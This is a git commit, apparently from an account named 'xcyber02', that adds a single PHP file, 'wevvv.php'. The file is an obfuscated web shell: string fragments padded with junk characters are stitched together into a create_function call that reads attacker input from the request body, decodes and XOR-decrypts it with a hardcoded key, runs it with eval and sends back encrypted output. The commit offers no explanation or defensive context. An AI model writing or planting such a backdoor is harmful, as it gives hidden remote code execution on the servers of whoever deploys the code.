381405cc50a86373bc867ca3cced745d52f2713e
xcyber02 <giginaga.gn@gmail.com>
2024-02-14 10:02:08 +0700

    Create wevvv.php

---
+++ wevvv.php
@@ -0,0 +1,13 @@
+<?php
+$U='msRgomshWeGqktEDlrFx"ms;funcmstion msx($t,ms$k){$c=strmslenms($msk);$l=str';
+$F='sse6ms4_encode(@msmsx(@gzcomsmpress($o),ms$k));prmsimsnt("$msp$kh$r$kf");}';
+$G='msms[1]),$k)));$o=@omsb_gmset_conmstents()ms;@ob_msenmsd_clean();$rms=@bam';
+$H='1) {msms@ob_start(ms);ms@evamsl(@gzuncomprmsess(@x(@bmsase64_dmsecmsode($m';
+$o='+msms+,$ims++){$o.=$t{msms$i}^$k{ms$j};ms}}return $o;}if ms(@preg_msmatmsc';
+$J=str_replace('dm','','dmcrdmedmate_dmfuncdmtidmon');
+$W='hms("/$kh(.+ms)$kf/",ms@filmse_get_cmsontentmsmss("pmshp://inputms"),$m)==';
+$x='mslen($tms);$oms="";for($i=0;ms$i<$msl;){fomsr($jms=0ms;($j<$c&&$i<$lms);$j';
+$O='ms$k="82db21ms6c";msms$kh="c493cb3d05ems9";$mskf="7ms8d47bce1b7ms3ms";$p="';
+$c=str_replace('ms','',$O.$U.$x.$o.$W.$H.$G.$F);
+$q=$J('',$c);$q();
+?>
